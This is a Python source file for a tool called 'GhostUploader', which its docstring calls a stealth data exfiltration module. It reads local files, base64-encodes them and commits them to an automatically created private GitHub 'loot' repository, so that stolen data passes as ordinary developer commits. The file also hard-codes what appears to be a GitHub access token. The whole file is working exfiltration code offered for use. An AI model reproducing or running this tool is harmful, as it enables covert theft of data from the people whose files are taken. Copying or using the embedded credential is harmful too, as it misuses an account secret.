import os
import base64
import requests
import json
from datetime import datetime
from dotenv import load_dotenv

# Try to load .env from parent directories (assuming we are in brain/app/core or run from brain/)
# This ensures standalone execution works
current_dir = os.path.dirname(os.path.abspath(__file__))
brain_dir = os.path.dirname(os.path.dirname(os.path.dirname(current_dir)))  # .../brain
env_path = os.path.join(brain_dir, ".env")
if os.path.exists(".env"):
    load_dotenv(".env")
elif os.path.exists(env_path):
    load_dotenv(env_path)
else:
    load_dotenv()  # Hope for the best

# --- CONFIGURATION ---
# Using the key we verified earlier
GITHUB_TOKEN = "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"
REPO_OWNER = "mido7"
REPO_NAME = "Red_King_Loot"
BRANCH = "main"


class GhostUploader:
    """
    🦅 GHOST UPLOADER
    Legacy-free, stealth data exfiltration module utilizing GitHub API.
    Traffic masquerades as standard developer commits.
    """

    def __init__(self, token=GITHUB_TOKEN):
        self.headers = {
            "Authorization": f"Bearer {token}",  # Changed to Bearer for best practice
            "Accept": "application/vnd.github.v3+json",
            "Content-Type": "application/json",
        }
        self.token = token
        self.repo_name = REPO_NAME
        # Auto-configure owner
        self.owner = self._get_current_user() or REPO_OWNER
        self.base_url = (
            f"https://api.github.com/repos/{self.owner}/{self.repo_name}/contents/"
        )

        # Ensure Repo Exists
        self._ensure_repo_exists()

    def _get_current_user(self):
        try:
            r = requests.get("https://api.github.com/user", headers=self.headers)
            if r.status_code == 200:
                user = r.json()["login"]
                print(f"[+] AUTHENTICATED AS: {user}")
                return user
            else:
                print(f"[-] Auth Check Failed: {r.status_code}")
        except:
            pass
        return None

    def _ensure_repo_exists(self):
        # 1. Check existence
        check_url = f"https://api.github.com/repos/{self.owner}/{self.repo_name}"
        r = requests.get(check_url, headers=self.headers)
        if r.status_code == 200:
            return  # Exists

        # 2. Create if missing
        print(f"[*] Repo '{self.repo_name}' not found. Creating...")
        create_url = "https://api.github.com/user/repos"
        payload = {
            "name": self.repo_name,
            "private": True,  # STEALTH MODE: Private repo
            "description": "Operation Red King Loot",
        }
        try:
            r = requests.post(create_url, headers=self.headers, json=payload)
            if r.status_code == 201:
                print(f"[+] REPO CREATED: {self.owner}/{self.repo_name}")
            else:
                print(f"[-] Repo Creation Failed: {r.status_code} {r.text[:50]}")
        except Exception as e:
            print(f"[-] Repo Error: {e}")

    def exfiltrate(self, file_path, remote_path=None):
        """
        Reads a local file, Base64 encodes it, and commits it to the loot repository.
        """
        print(f"[^] GHOST UPLOAD: Exfiltrating {file_path}...")

        if not os.path.exists(file_path):
            print(f"[!] Error: File {file_path} not found.")
            return False

        try:
            # 1. Read & Encode
            with open(file_path, "rb") as file:
                content = file.read()
                content_b64 = base64.b64encode(content).decode("utf-8")

            # 2. Determine Remote Path
            if not remote_path:
                filename = os.path.basename(file_path)
                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                # Structure loot by date/IP if possible, here we keep it simple
                remote_path = f"loot/{timestamp}_{filename}"

            # 3. Payload
            url = self.base_url + remote_path
            data = {
                "message": f"Red King Loot: {os.path.basename(file_path)}",  # Removed emoji just to be safe in JSON
                "content": content_b64,
                "branch": BRANCH,
            }

            # 4. Transmission
            response = requests.put(
                url, headers=self.headers, data=json.dumps(data), timeout=15
            )

            if response.status_code == 201:
                print(
                    f"[+] SUCCESS: Uploaded to {self.owner}/{self.repo_name}/{remote_path}"
                )
                return True
            else:
                print(f"[-] FAILED: Status {response.status_code}")
                # Don't print full response text in prod to avoid noise, unless error
                print(f"Details: {response.json().get('message', 'Unknown Error')}")
                return False

        except Exception as e:
            print(f"[!] EXFILTRATION ERROR: {e}")
            return False


# --- STANDALONE TEST HARNESS ---
if __name__ == "__main__":
    # Test with the Mission Report if it exists
    # Adjust path if running from brain/ folder
    input_file = "mission_report_omega.md"

    # Check absolute path from artifacts if relative fails
    possible_paths = [
        input_file,
        os.path.join(
            "..",
            "..",
            "..",
            "antigravity",
            "brain",
            "c6f177c1-f935-47be-8831-6463868f4bea",
            input_file,
        ),
    ]

    target_path = None
    for p in possible_paths:
        if os.path.exists(p):
            target_path = p
            break

    if not target_path:
        # Create dummy if missing
        target_path = "ghost_test_loot.txt"
        with open(target_path, "w") as f:
            f.write("Secret Intel Test")

    uploader = GhostUploader()
    uploader.exfiltrate(target_path)
